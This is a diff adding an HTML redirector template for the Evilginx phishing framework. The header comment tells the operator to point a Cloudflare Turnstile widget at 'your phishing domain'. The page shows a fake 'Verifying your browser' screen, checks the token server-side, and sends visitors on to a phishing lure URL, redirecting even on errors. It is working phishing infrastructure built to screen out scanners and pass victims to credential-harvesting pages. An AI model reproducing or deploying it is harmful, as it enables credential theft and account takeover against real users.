@@ -1,0 +1,177 @@
+<!--
+    Cloudflare Turnstile Redirector with Server-Side Verification
+
+    Setup:
+    1. Create a new Turnstile Site in your Cloudflare dashboard
+    2. Set 'Domain' to your phishing domain (e.g., my.phishing.domain.com)
+    3. Set 'Widget Mode' to 'Invisible' for seamless verification (or 'Managed' for interactive)
+    4. Configure in Evilginx CLI:
+       turnstile sitekey YOUR_SITE_KEY
+       turnstile secretkey YOUR_SECRET_KEY
+       turnstile enable
+-->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            border-radius: 16px;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 90%;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 1.5rem;
+        }
+        p {
+            color: #666;
+            font-size: 0.95rem;
+        }
+        #cf-turnstile {
+            margin: 20px auto;
+            display: flex;
+            justify-content: center;
+        }
+        .error {
+            color: #dc3545;
+            margin-top: 15px;
+            display: none;
+        }
+        .retry-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            margin-top: 15px;
+            display: none;
+            font-size: 0.9rem;
+        }
+        .retry-btn:hover {
+            background: #5a6fd6;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner" id="spinner"></div>
+        <h2>Verifying your browser</h2>
+        <p>Please wait while we verify you're not a robot...</p>
+        <div id="cf-turnstile"></div>
+        <p class="error" id="error-msg">Verification failed. Please try again.</p>
+        <button class="retry-btn" id="retry-btn" onclick="retryVerification()">Retry</button>
+    </div>
+
+    <script>
+        var lureUrl = {lure_url_js};
+        var verifying = false;
+
+        function showError(msg) {
+            document.getElementById('spinner').style.display = 'none';
+            document.getElementById('error-msg').textContent = msg || 'Verification failed. Please try again.';
+            document.getElementById('error-msg').style.display = 'block';
+            document.getElementById('retry-btn').style.display = 'inline-block';
+        }
+
+        function verifyToken(token) {
+            if (verifying) return;
+            verifying = true;
+
+            fetch('/_turnstile/verify', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    token: token,
+                    redirect_url: lureUrl
+                })
+            })
+            .then(function(response) {
+                return response.json();
+            })
+            .then(function(data) {
+                if (data.success && data.redirect_url) {
+                    window.location.assign(data.redirect_url);
+                } else if (data.error) {
+                    showError(data.error);
+                    verifying = false;
+                } else {
+                    // Fallback: redirect anyway if we got a redirect_url
+                    if (data.redirect_url) {
+                        window.location.assign(data.redirect_url);
+                    } else {
+                        window.location.assign(lureUrl);
+                    }
+                }
+            })
+            .catch(function(err) {
+                console.error('Verification error:', err);
+                // Fallback: redirect to lure URL on network error
+                window.location.assign(lureUrl);
+            });
+        }
+
+        function retryVerification() {
+            document.getElementById('error-msg').style.display = 'none';
+            document.getElementById('retry-btn').style.display = 'none';
+            document.getElementById('spinner').style.display = 'block';
+            verifying = false;
+            turnstile.reset('#cf-turnstile');
+        }
+
+        turnstile.ready(function() {
+            turnstile.render('#cf-turnstile', {
+                sitekey: '{turnstile_sitekey}',
+                callback: function(token) {
+                    verifyToken(token);
+                },
+                'error-callback': function() {
+                    showError('Challenge failed. Please try again.');
+                },
+                'expired-callback': function() {
+                    showError('Challenge expired. Please try again.');
+                    verifying = false;
+                }
+            });
+        });
+    </script>
+</body>
+</html>
